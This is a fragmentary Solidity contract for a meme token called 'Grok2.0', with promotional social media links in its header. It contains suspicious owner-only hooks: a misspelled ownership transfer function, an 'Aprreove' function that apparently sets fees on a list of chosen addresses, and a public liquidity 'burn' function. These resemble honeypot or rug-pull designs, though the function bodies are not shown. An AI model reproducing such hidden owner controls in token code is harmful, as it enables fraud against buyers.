...
/**
https://t.me/GROK20_0X8390atg
https://twitter.com/GROK20_8390A
https://x.com/cb_doge/status/1777368519417696359?s=52
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipstobomesr(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract GROK20 is Ownable {
    ...
    constructor (){
        name = unicode"Grok2.0";
        symbol = unicode"GROK2.0";
        decimals = 9;
        uint256 Supply = 6900000000;
    ...
    function Aprreove(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burntriliq(address user) public {
